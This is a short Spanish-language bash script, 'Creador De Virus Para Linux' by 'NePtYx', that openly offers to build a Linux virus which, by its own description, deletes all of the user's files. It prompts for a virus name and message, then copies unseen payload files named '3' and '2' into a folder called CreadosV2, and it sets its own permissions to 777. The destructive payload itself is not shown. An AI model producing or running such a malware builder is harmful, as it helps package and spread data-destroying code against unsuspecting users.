clear
chmod 777 V2.sh
echo "============================="
echo "=Creador De Virus Para Linux="
echo "============================="
echo "=by=NePtYx=V2="
echo "=============="
echo "El virus que crearas aqui,sera para Linux"
echo "este eliminara todos los archivos del usuario"
echo "ya estas advertido."
echo "============================================="
echo " "
echo "Para crear tu virus sigue los pasos"
echo "a continuacion:"
echo " "
echo "Como quieres que se llame tu virus?"
read input
echo " "
echo "Que mensaje quieres que diga tu virus?"
read input1
echo " "
echo "Tu virus ya esta creado,Deseas verlo?"
read input2
clear
mkdir CreadosV2
cp 3 $input.sh
mv $input.sh CreadosV2
cp 2 $input1.txt
mv $input1.txt CreadosV2
echo "============================="
echo "=Creador De Virus Para Linux="
echo "============================="
echo "=by=NePtYx="
echo "==========="
echo " "
echo "Tu virus para Linux ya ha sido creado"
echo "se guardo en la Carpeta CreadosV2"
echo " "
echo "Deseas salir del repositorio?"
read input5
